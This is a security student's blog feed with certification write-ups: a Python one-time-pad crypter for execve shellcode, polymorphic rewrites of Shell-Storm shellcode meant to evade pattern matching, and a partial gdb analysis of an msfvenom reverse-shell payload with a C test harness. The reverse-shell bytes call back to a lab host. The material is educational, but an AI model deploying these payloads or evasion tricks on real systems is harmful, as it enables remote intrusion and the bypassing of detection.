<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.8.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2019-06-09T23:08:56+03:00</updated><id>http://localhost:4000/</id><title type="html">Silvia’s blog</title><subtitle>Random notes or stuff I am curious about.
</subtitle><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><entry><title type="html">Custom encrypter - One-time pad (OTP)</title><link href="http://localhost:4000/blog/2019-05-02-blog-SLAE7/" rel="alternate" type="text/html" title="Custom encrypter - One-time pad (OTP)" /><published>2019-05-02T00:00:00+03:00</published><updated>2019-05-02T00:00:00+03:00</updated><id>http://localhost:4000/blog/blog-SLAE7</id><content type="html" xml:base="http://localhost:4000/blog/2019-05-02-blog-SLAE7/">&lt;p&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert Certification&lt;/a&gt;. The task for 7/7 assignment is to create a custom crypter using any existing encryption schema. It can be written in any programming language of one’s choice.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;

&lt;h3 id=&quot;custom-encrypter---one-time-pad&quot;&gt;Custom encrypter - one time pad&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;The encryption routine I chose for this assignment is the &lt;strong&gt;One-time pad (OTP)&lt;/strong&gt;, which for it to work, needs a pre-shared key. The need for a pre-shared key in order to decrypt the payload is unfortunately one of the problems coming up when talking about the OTP. If the key sharing is not done securely, there is no point of using one-time pads in the first place. As this write-up won’t touch the topic of key sharing one bit, I assume one should come up with idea to share it securely outside the bounds of this little article.&lt;/p&gt;

&lt;p&gt;The simple idea behind using a one-time pad can be described with a small example. If we have plain text &lt;strong&gt;a&lt;/strong&gt;, and we have securely pre-shared a secret key &lt;strong&gt;b&lt;/strong&gt;, then to have an encrypted text we would xor &lt;strong&gt;a&lt;/strong&gt; and &lt;strong&gt;b&lt;/strong&gt;. In order to decrypt the message we would use the pre-shared key &lt;strong&gt;b&lt;/strong&gt; again to xor it with the encrypted text instead. In such a way we would end up again with the original text &lt;strong&gt;a&lt;/strong&gt;. The following scheme describes the exact same steps taken:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/encrypter.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;random-key-generation&quot;&gt;Random key generation&lt;/h4&gt;

&lt;p&gt;How do you create a key that is truely random? This is another problem aside from sharing the key itself. This is the moment, where if you would start looking around in the Internet, you would stumble upon pseudo-random number generators and true random number generators. Since I made up my mind that I would be using Python for this assignment, I decided to look what this language has to offer me out of the box and ended up using the &lt;code class=&quot;highlighter-rouge&quot;&gt;urandom()&lt;/code&gt; function from the &lt;code class=&quot;highlighter-rouge&quot;&gt;os&lt;/code&gt; module. I made this choice following Python’s own suggestions at generating pseudo-random numbers &lt;a href=&quot;https://docs.python.org/2/library/random.html&quot;&gt;1&lt;/a&gt; page where they state:&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;“Warning The pseudo-random generators of this module should not be used for security purposes. Use os.urandom() or SystemRandom if you require a cryptographically secure pseudo-random number generator.”&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Another thing with one-time pad is that the key can be the same length as the payload or longer. I decided to keep it the same length with the payload itself.&lt;/p&gt;

&lt;h4 id=&quot;encryption&quot;&gt;Encryption&lt;/h4&gt;

&lt;p&gt;So finally the encryption routine ended up pretty short and simple, but as I decided to use Python 3 instead of 2 (nice experience for the future), it took me a little while. As os.urandom creates a random string of specified length and key[i] would give its decimal representation I could directly use it in xor. On the otherhand plaintext[i] would still need the ord() function applied in order to return an integer instead of an ascii char. The result of the xor operation still needed some formating as results like &lt;code class=&quot;highlighter-rouge&quot;&gt;0b&lt;/code&gt; would by default be displayed just &lt;code class=&quot;highlighter-rouge&quot;&gt;b&lt;/code&gt; in the final encrypted string. The formating here was important as I wanted to have the encrypted payload exactly the same length as the original payload. In this case, 43 bytes.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import os, codecs

def encrypt(plaintext, key):
	print (&quot;[+] -------- Encryption --------&quot;)
	print (&quot;[+] Key: &quot;+str(codecs.encode(key, 'hex')))
	encrypted = &quot;&quot;

	for i in range(len(plaintext)):
		c = ord(plaintext[i]) ^ key[i]
		d = &quot;{:02x}&quot;.format(c)
		#print (&quot;i:&quot;+str(i)+&quot; P: &quot;+str(plaintext[i])+&quot; K: &quot;+str(key[i])+&quot; C:&quot;+str(c)+&quot; D:&quot;+str(d))
		encrypted += d

	print (&quot;[+] Encrypted string: &quot;+encrypted)
	return encrypted

plaintext = &quot;&quot;&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08
\x48\x89\xd9\x51\x48\x89\xe7\x52\x48\x83\xec\x08\x48\x89\x3c\x24\x48
\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;&quot;&quot;
key = os.urandom(len(plaintext))
encrypted = encrypt(plaintext,key)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The final output would look as follows (python3 ./program.py encrypt payload)&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3 encrypt.py
[+] -------- Encryption --------
[+] Key: b'81a6b9cc11b37a5ce9d32ed80bdd18393eb275088b5bff05befe12ccff9d58613b597a5e5d002401d0ee73'
[+] Encrypted string: c9976b84aa9c553e80bd01ab6395d9d236fafcd1da1376e2ecb69120f7d5d15d1f11f3b81531e4b1ebe176
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;decryption&quot;&gt;Decryption&lt;/h4&gt;

&lt;p&gt;For the decryption I needed my code to perform the same xor operation again, but on the encrypted payload with the shared key.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import codecs

def decrypt(encrypted, key):
	print (&quot;[+] -------- Decryption --------&quot;)
	decrypted = &quot;&quot;
	msg = codecs.decode(encrypted, 'hex')

	for i in range(len(msg)):
		c =  msg[i] ^ key[i]
		d = &quot;{:02x}&quot;.format(c)
		decrypted += d

	print (&quot;[+] Decrypted string (XX): \n&quot;+decrypted)
	print(&quot;[+] Decrypted string (\\xXX):\n&quot; + r&quot;\x&quot; + r&quot;\x&quot;.join(decrypted[n : n+2] for n in range(0, len(decrypted), 2)))

encrypted = &quot;ad15b360f30576bb4a0a75476da68ad1d287c22c078ad2b71929cb3de177e13fdea4a0ff4441e94195222e&quot;
key = &quot;e5246128482a59d923645a3405ee4b3adacf4bf556c25b504b6148d1e93f6803faec29190c7029f1ae2d2b&quot;

decrypt(encrypted, codecs.decode(key, 'hex'))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The final output would look as follows, so we end up with our initial plaintext payload:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3 decrypt.py
[+] -------- Decryption --------
[+] Decrypted string (XX):
4831d248bb2f2f62696e2f736848c1eb084889d9514889e7524883ec0848893c244889e64831c0b03b0f05
[+] Decrypted string (\xXX):
\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x48\x89\xd9\x51\x48
\x89\xe7\x52\x48\x83\xec\x08\x48\x89\x3c\x24\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Link to source code in Github: &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task7/encrypter.py&quot;&gt;encrypter&lt;/a&gt; and &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task7/decrypter.py&quot;&gt;decrypter&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;related-posts&quot;&gt;Related posts:&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-15-blog-SLAE1/&quot;&gt;64-bit bindshell with a passphrase protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/&quot;&gt;64-bit reverse shell with passphrase protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE3/&quot;&gt;Egghunter (64-bit Linux) using access() syscall&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE4/&quot;&gt;Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE51/&quot;&gt;Msfvenom generated Exec shellcode analysis - exec shellcode&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE52/&quot;&gt;Msfvenom generated bind_tcp shellcode analysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE53/&quot;&gt;Msfvenom generated shell_reverse_tcp payload&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE6/&quot;&gt;Polymorphic shellcodes for samples taken from Shell-Storm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE7/&quot;&gt;Custom encrypter - One-time pad (OTP)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification. The task for 7/7 assignment is to create a custom crypter using any existing encryption schema. It can be written in any programming language of one’s choice.</summary></entry><entry><title type="html">Polymorphic shellcodes for samples taken from Shell-Storm</title><link href="http://localhost:4000/blog/2019-05-01-blog-SLAE6/" rel="alternate" type="text/html" title="Polymorphic shellcodes for samples taken from Shell-Storm" /><published>2019-05-01T00:00:00+03:00</published><updated>2019-05-01T00:00:00+03:00</updated><id>http://localhost:4000/blog/blog-SLAE6</id><content type="html" xml:base="http://localhost:4000/blog/2019-05-01-blog-SLAE6/">&lt;p&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert Certification&lt;/a&gt;. The task for 6/7 assignment is to take up to 3 shellcodes from shell-storm and create polymorphic versions of those samples to beat pattern matching. The requirement is that the polymorphic versions cannot be larger than the 150% of the existing shellcode.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;

&lt;h3 id=&quot;shellcode-1---execve&quot;&gt;Shellcode 1 - &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;The &lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-603.php&quot;&gt;first shellcode&lt;/a&gt; I chose from the Shell-Storm website was a generic 64-bit &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; shellcode which is 30 bytes long. So, I created a polymorphic version with the length of 43 bytes (less than 150% of the original shellcode). On the picture below I have shown which exact instructions got replaced with something else and then continue to explain each desicion one step at a time.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/shellcode1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1&lt;/strong&gt; - Instead of the &lt;code class=&quot;highlighter-rouge&quot;&gt;push rax&lt;/code&gt; marked in yellow, I decided to &lt;code class=&quot;highlighter-rouge&quot;&gt;xor rdx, rdx&lt;/code&gt; first and use that instead, as I would be needing to set &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; zero anyway to prepare it for the &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; syscall.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2&lt;/strong&gt; - I also decided to replace the &lt;code class=&quot;highlighter-rouge&quot;&gt;push rbx&lt;/code&gt; (in green) from the original shellcode in a manner where I could get the same result but via another register. For that I simply chose to move the value in &lt;code class=&quot;highlighter-rouge&quot;&gt;rbx&lt;/code&gt; to another register which I then push’ed instead.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3&lt;/strong&gt; - To prepare the 2nd argument &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; for the syscall, I took another way of first allocating space for it right after I had pushed 8 zero-bytes to the stack. Then moved the value from &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; to an address appointed to by the stack pointer (so right to the spot which I just allocated) and moved that address to &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4&lt;/strong&gt; - since I did not clean the &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; register somewhere earlier, I made sure it was zeroed out before loading the syscall number to it and executed the syscall.&lt;/p&gt;

&lt;h3 id=&quot;shellcode-2---execveat&quot;&gt;Shellcode 2 - &lt;code class=&quot;highlighter-rouge&quot;&gt;execveat()&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;Going through shellcodes at Shell-Storm, I came by a &lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-905.php&quot;&gt;shellcode&lt;/a&gt; which used the &lt;code class=&quot;highlighter-rouge&quot;&gt;execveat()&lt;/code&gt; syscall. I had never tried it myself before so seemed an interesting way to go with that one. I ended up with a 31 byte long polymorphic version of that shellcode, so only 2 bytes longer than the original one.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/shellcode2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1&lt;/strong&gt; - the author of the original shellcode wanted to prepare the syscall number 0x142 for &lt;code class=&quot;highlighter-rouge&quot;&gt;execveat()&lt;/code&gt; as the very first thing. Without loading the value directly to its intended register &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt;, he loaded a value 0x42 and then incremented the &lt;code class=&quot;highlighter-rouge&quot;&gt;ah&lt;/code&gt; by 1 ending up with the value 0x142. I decided to go the other way around and substract 1 from 0x143 instead, ending up with the same result.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;cqo&lt;/code&gt; is an intresting instruction, which doubles the size of the operand in register &lt;code class=&quot;highlighter-rouge&quot;&gt;ax/eax/rax&lt;/code&gt; and stores the result as &lt;code class=&quot;highlighter-rouge&quot;&gt;dx:ax/edx:eax/rdx:rax&lt;/code&gt;. so basically what happens here is that &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; register will simply be zerod out, because of sign-extending. We can get the same result by xor’ing &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; with itself.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3&lt;/strong&gt; - the instructions marked in blue, where the program name “/bin/sh” is placed eventually to the top of the stack with &lt;code class=&quot;highlighter-rouge&quot;&gt;push reg&lt;/code&gt; instruction, I simply used another register (&lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; –&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;rcx&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4&lt;/strong&gt; - I removed the lines marked in red, as there was no need for those instructions. This ended up shortening my shellcode a little bit as well.&lt;/p&gt;

&lt;h3 id=&quot;shellcode-3---execve&quot;&gt;Shellcode 3 - &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-806.php&quot;&gt;Shellcode&lt;/a&gt; number 3 is 27 bytes in length and quite much similar to the first one, but gets the program name for &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; by negating the value in &lt;code class=&quot;highlighter-rouge&quot;&gt;rbx&lt;/code&gt;. I decided to go with the &lt;code class=&quot;highlighter-rouge&quot;&gt;imul&lt;/code&gt; instruction instead as you can see on the image below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/shellcode3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1&lt;/strong&gt; - I chose to substract the value in &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; from itself, ending up with a zero.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2&lt;/strong&gt; - Next I moved the value 0xEEBE234583299 to &lt;code class=&quot;highlighter-rouge&quot;&gt;rbx&lt;/code&gt;. Multiplying it with 0x7 &lt;code class=&quot;highlighter-rouge&quot;&gt;EEBE234583299 × 7 = 68732F6E69622F&lt;/code&gt; and converting this hex value to ascii, will give us the string &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;cdq&lt;/code&gt; replacement with &lt;code class=&quot;highlighter-rouge&quot;&gt;mov rdx, rax&lt;/code&gt; allowed me to have the same effect of zeroing out &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; as I assured earlier that the value in &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; would be zero.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4&lt;/strong&gt; - Finally the &lt;code class=&quot;highlighter-rouge&quot;&gt;pop rsi&lt;/code&gt; instruction. What pop essentially does is that it takes the value stored at an address pointed to by &lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt; and places that value into rsi. As a side-effect, &lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt; is incremented by 8. So, by using the &lt;code class=&quot;highlighter-rouge&quot;&gt;mov rsi, [rsp]&lt;/code&gt; I am going for the value stored at an address &lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt; and moving it to &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt;. Then with &lt;code class=&quot;highlighter-rouge&quot;&gt;add rsp, 0x8&lt;/code&gt; I increment the &lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt; as this is what would happen automatically if I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;pop&lt;/code&gt; instruction.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;So what we learnt?&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cqo&lt;/code&gt; is good to use when you try to zero out rdx by sign-extending the value in rax&lt;/li&gt;
  &lt;li&gt;We can switch up the registers we use in our shellcode super easily&lt;/li&gt;
  &lt;li&gt;We can use various combinations of instructions to end up with the same result value&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task6/shellcode1.nasm&quot;&gt;Polymorphic shellcode1.nasm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task6/shellcode2.nasm&quot;&gt;Polymorphic shellcode2.nasm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task6/shellcode3.nasm&quot;&gt;Polymorphic shellcode3.nasm&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;related-posts&quot;&gt;Related posts:&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-15-blog-SLAE1/&quot;&gt;64-bit bindshell with a passphrase protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/&quot;&gt;64-bit reverse shell with passphrase protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE3/&quot;&gt;Egghunter (64-bit Linux) using access() syscall&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE4/&quot;&gt;Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE51/&quot;&gt;Msfvenom generated Exec shellcode analysis - exec shellcode&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE52/&quot;&gt;Msfvenom generated bind_tcp shellcode analysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE53/&quot;&gt;Msfvenom generated shell_reverse_tcp payload&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE6/&quot;&gt;Polymorphic shellcodes for samples taken from Shell-Storm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE7/&quot;&gt;Custom encrypter - One-time pad (OTP)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification. The task for 6/7 assignment is to take up to 3 shellcodes from shell-storm and create polymorphic versions of those samples to beat pattern matching. The requirement is that the polymorphic versions cannot be larger than the 150% of the existing shellcode.</summary></entry><entry><title type="html">Msfvenom generated shell_reverse_tcp payload</title><link href="http://localhost:4000/blog/2019-05-01-blog-SLAE53/" rel="alternate" type="text/html" title="Msfvenom generated shell_reverse_tcp payload" /><published>2019-05-01T00:00:00+03:00</published><updated>2019-05-01T00:00:00+03:00</updated><id>http://localhost:4000/blog/blog-SLAE53</id><content type="html" xml:base="http://localhost:4000/blog/2019-05-01-blog-SLAE53/">&lt;p&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert Certification&lt;/a&gt;. The task for 5.3/7 assignment is to analyse at least 3 shellcode examples created using Msfpayload for linux/x86_64. Since msfpayload is outdated, I used msfvenom instead. The analysis of the shellcodes is carried out using the gdb debugger and 3/3 shellcode analysed in this article is the shell_reverse_tcp payload.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;

&lt;h3 id=&quot;msfvenom-generated-linuxx64shell_reverse_tcp-payload&quot;&gt;MSFvenom generated linux/x64/shell_reverse_tcp payload&lt;/h3&gt;

&lt;p&gt;As a follow up to analysing &lt;a href=&quot;/blog/2019-05-01-blog-SLAE51&quot;&gt;exec shellcode&lt;/a&gt; and &lt;a href=&quot;/blog/2019-05-01-blog-SLAE52&quot;&gt;bind shellcode&lt;/a&gt;, I am going to be analysing the linux/x64/shell_reverse_tcp as final payload for task number 5. This payload is used to make the connection back to the attackers machine and spawn a command shell. In order to generate the payload I used the following command:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x64/shell_reverse_tcp -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of c file: 335 bytes
unsigned char buf[] =
&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48&quot;
&quot;\xb9\x02\x00\x11\x5c\x0a\x00\x02\x0f\x51\x48\x89\xe6\x6a\x10&quot;
&quot;\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58&quot;
&quot;\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f&quot;
&quot;\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;shellcode-test-program&quot;&gt;Shellcode test program&lt;/h4&gt;

&lt;p&gt;In order to analyse the generated payload I am placing it into the C program which will be executing the shellcode:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;

unsigned char code[] = \
&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48&quot;
&quot;\xb9\x02\x00\x11\x5c\x0a\x00\x02\x0f\x51\x48\x89\xe6\x6a\x10&quot;
&quot;\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58&quot;
&quot;\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f&quot;
&quot;\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;;

int main()
{
  printf(&quot;Shellcode Length:  %d\n&quot;, (int)strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and finally compile the C program as follows:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -m64 -fno-stack-protector -z execstack testshellcode.c -o testshellcode -no-pie
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;analysis&quot;&gt;Analysis&lt;/h3&gt;

&lt;p&gt;I will be taking the same type of approach in the analysis of this payload as in the previous one for bind shellcode. There are 4 syscalls being executed so let’s go through them one by one. The concept of a reverse shellcode is that there is an attacker controlled machine somewhere where the attacker is waiting a connection back on a specific port and it is shellcode’s job to make initiate that connection.&lt;/p&gt;

&lt;p&gt;For that to happen this generated payload makes use of a chain of syscalls –&amp;gt; it first creates a new &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt;, then attempts to &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; to the attacker controlled machine and once it does, it launches the &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; syscall.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/msfvenom_syscall2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;syscall number, 0x29 is placed to &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt; right in the beginning with 2 instructions &lt;code class=&quot;highlighter-rouge&quot;&gt;push 0x29&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;pop rax&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;cdq is then used to sign-extend the value in &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt;, which means it would zero out &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; which is pretty convenient&lt;/li&gt;
  &lt;li&gt;with next push’es and pop’s 0x2 and 0x1 are placed to &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt; respectively, so we could finally launch the &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt; syscall&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x0000000000601060 &amp;lt;code+0&amp;gt;:  push   0x29
   0x0000000000601062 &amp;lt;code+2&amp;gt;:  pop    rax
